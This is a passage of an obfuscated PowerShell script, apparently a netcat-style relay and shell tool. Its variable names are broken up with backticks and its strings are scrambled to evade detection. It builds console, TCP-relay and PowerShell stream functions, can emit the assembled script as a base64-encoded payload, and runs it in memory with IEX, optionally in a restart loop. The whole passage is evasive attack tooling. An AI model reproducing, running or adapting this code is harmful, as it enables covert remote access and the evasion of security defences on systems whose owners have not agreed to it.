    ${FunCTI`On`Str`Ing} += ( "function Stream2_Setup`n{`n"  +  ${function:Setup_CMD} +  "`n}`n`n" )
    ${F`UNcT`iOnsTR`I`Ng} += ( "function Stream2_ReadData`n{`n"   +   ${function:ReadData_CMD} +   "`n}`n`n"  )
    ${FuNCt`IONstR`I`Ng} += ( "function Stream2_WriteData`n{`n"   +  ${function:WriteData_CMD}   + "`n}`n`n"  )
    ${fU`Ncti`on`sTr`INg} += ( "function Stream2_Close`n{`n"   +  ${function:Close_CMD}   +  "`n}`n`n" )
    ${i`NvO`ke`STRInG} += "@('$e')`n`n"
  }
  elseif(  ${E`P} )
  {
    Write-Verbose ( "{1}{5}{3}{2}{0}{4}"-f 'w','Set S',': Po','2','ershell','tream '  )
    ${InvO`ke`sT`RI`Ng} += "`n`n"
  }
  elseif(  ${r} -ne "")
  {
    
    if(  ${R}.split(  ":"  )[0].ToLower(  ) -eq "tcp")
    {
      Write-Verbose (  "{1}{2}{5}{4}{0}{3}"-f'm 2','Set ','Str',': TCP','a','e' )
      ${FuncTION`StR`Ing} += ( "function Stream2_Setup`n{`n"  +   ${function:Setup_TCP} + "`n}`n`n"  )
      ${FuNcT`IO`NsT`RInG} += ( "function Stream2_ReadData`n{`n" +  ${function:ReadData_TCP} + "`n}`n`n")
      ${f`UNCt`IO`NStRI`NG} += ( "function Stream2_WriteData`n{`n" +   ${function:WriteData_TCP}   +   "`n}`n`n" )
      ${Fun`CTions`Tr`iNG} += (  "function Stream2_Close`n{`n" +  ${function:Close_TCP} + "`n}`n`n" )
      if(  ${R}.split(  ":" ).Count -eq 2  ){${InV`oKeSTR`INg} += ("@('',`$True,'" +  ${r}.split(":")[1]  +  ( "','$t') " +  '' )  )}
      elseif(${R}.split(":"  ).Count -eq 3 ){${iNV`OKE`STR`ING} += (  "@('"   +  ${R}.split( ":"  )[1]  + "',`$False,'"   +   ${R}.split(  ":" )[2]  +  (  "','$t') "+  '' )  )}
      else{return (  "{3}{2}{0}{1}"-f 'ay for','mat.','ad rel','B'  )}
    }
  }
  else
  {
    Write-Verbose ( "{2}{1}{4}{3}{5}{0}{6}" -f'am 2: ','e','S','Str','t ','e','Console')
    ${fUN`cti`O`NST`RING} += ( "function Stream2_Setup`n{`n"   +   ${function:Setup_Console}   +   "`n}`n`n")
    ${FUNc`TioNsTr`I`NG} += ( "function Stream2_ReadData`n{`n"   + ${function:ReadData_Console} +   "`n}`n`n"  )
    ${FUN`CTioN`STRi`Ng} += ( "function Stream2_WriteData`n{`n"  +  ${function:WriteData_Console} + "`n}`n`n")
    ${FUNcTionS`T`R`INg} += ( "function Stream2_Close`n{`n" +   ${function:Close_Console} +   "`n}`n`n")
    ${InvOKEST`RI`Ng} += ("@('"  +  ${O}   + "')" )
  }
  
  if(${e`P}){${FuN`cti`OnS`TrinG} += ( "function Main`n{`n"   +  ${function:Main_Powershell}   + "`n}`n`n"  )}
  else{${fuN`ctioNstR`ing} += ("function Main`n{`n"  +   ${function:Main}   +  "`n}`n`n" )}
  ${I`Nv`okesTr`INg} =   (  ${funCt`iONSTr`i`NG} + ${inV`okEstr`InG}  )
  
  
  
  if(  ${g`e}  ){Write-Verbose ( "{0}{3}{1}{2}{4}{7}{8}{6}{5}" -f 'Re','urning En','co','t','ded ','.','.','Payloa','d.' )   ;   return [Convert]::ToBase64String(  [System.Text.Encoding]::Unicode.GetBytes(${Inv`ok`eS`TrInG}) )}
  elseif( ${G}  ){Write-Verbose ("{1}{0}{3}{2}" -f 'ning Paylo','Retur','..','ad.' )  ;   return ${I`NvO`KEsTRInG}}
  
  
  
  ${OutP`UT} =  ${nu`LL}
  try
  {
    if( ${r`eP})
    {
      while( ${T`RuE})
      {
        ${Out`puT} += IEX ${INvoKE`S`TR`Ing}
        Start-Sleep -s 2
        Write-Verbose ( "{5}{0}{4}{1}{2}{3}" -f 'pe','e','d: Restarting','...','tition Enabl','Re'  )
      }
    }
    else
    {
      ${oU`TPut} += IEX ${InV`oK`ESTR`I`Ng}
    }
  }
  finally
  {
    if(${O`UTpUT} -ne ${N`Ull} )
    {
      if(${oF} -eq ""){${o`Ut`pUt}}
      else{[io.file]::WriteAllBytes( ${o`F},${Ou`T`PuT}  )}
    }
  }
  
}
